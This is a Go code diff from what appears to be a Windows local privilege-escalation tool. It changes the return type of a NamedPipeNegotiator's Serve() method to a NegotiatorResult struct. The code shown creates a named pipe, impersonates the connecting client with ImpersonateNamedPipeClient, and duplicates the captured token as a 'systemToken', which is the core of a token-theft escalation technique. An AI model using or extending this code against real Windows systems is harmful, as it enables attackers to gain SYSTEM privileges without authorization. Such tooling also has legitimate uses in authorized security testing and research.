@@ -11,7 +11,7 @@ import (
 
 type NamedPipeNegotiator struct{}
 
-func (negotiator NamedPipeNegotiator) Serve() (*windows.Token, error) {
+func (negotiator NamedPipeNegotiator) Serve() NegotiatorResult {
 	var sd windows.SECURITY_DESCRIPTOR
 	pipeName := "\\\\.\\pipe\\test"
 
@@ -34,7 +34,7 @@ func (negotiator NamedPipeNegotiator) Serve() (*windows.Token, error) {
 
 	if err != nil {
 		fmt.Println("[!] Failed to create pipe "+pipeName+": ", windows.GetLastError())
-		return nil, err
+		return NegotiatorResult{nil, err}
 	}
 
 	fmt.Println("[+] Created pipe, listening for connections")
@@ -43,7 +43,7 @@ func (negotiator NamedPipeNegotiator) Serve() (*windows.Token, error) {
 	if err != nil {
 		fmt.Println("[!] Failed to connect to pipe "+pipeName+": ", windows.GetLastError())
 		windows.CloseHandle(pipeHandle)
-		return nil, err
+		return NegotiatorResult{nil, err}
 	}
 
 	fmt.Println("[+] Connection established, duplicating client token")
@@ -53,21 +53,21 @@ func (negotiator NamedPipeNegotiator) Serve() (*windows.Token, error) {
 
 	if err != nil {
 		fmt.Println("[!] Failed to read from pipe")
-		return nil, err
+		return NegotiatorResult{nil, err}
 	}
 
 	_, _, err = impersonateNamedPipeClient.Call(uintptr(pipeHandle))
 
 	if err != syscall.Errno(0) {
 		fmt.Println("[!] Call to ImpersonateNamedPipeClient failed")
-		return nil, err
+		return NegotiatorResult{nil, err}
 	}
 
 	threadHandle, err := windows.GetCurrentThread()
 
 	if err != nil {
 		fmt.Println("[!] Failed to get current thread")
-		return nil, err
+		return NegotiatorResult{nil, err}
 	}
 
 	var threadToken windows.Token
@@ -75,7 +75,7 @@ func (negotiator NamedPipeNegotiator) Serve() (*windows.Token, error) {
 
 	if err != nil {
 		fmt.Println("[!] Failed to open thread token")
-		return nil, err
+		return NegotiatorResult{nil, err}
 	}
 
 	var systemToken windows.Token
@@ -83,7 +83,7 @@ func (negotiator NamedPipeNegotiator) Serve() (*windows.Token, error) {
 
 	if err != nil {
 		fmt.Println("[!] Failed to duplicate client token")
-		return nil, err
+		return NegotiatorResult{nil, err}
 	}
 
 	hostName, _ := os.Hostname()
@@ -95,7 +95,7 @@ func (negotiator NamedPipeNegotiator) Serve() (*windows.Token, error) {
 	windows.RevertToSelf()
 	windows.CloseHandle(pipeHandle)
 
-	return &systemToken, nil
+	return NegotiatorResult{&systemToken, nil}
 }
 
 func (negotiator NamedPipeNegotiator) Trigger() bool {
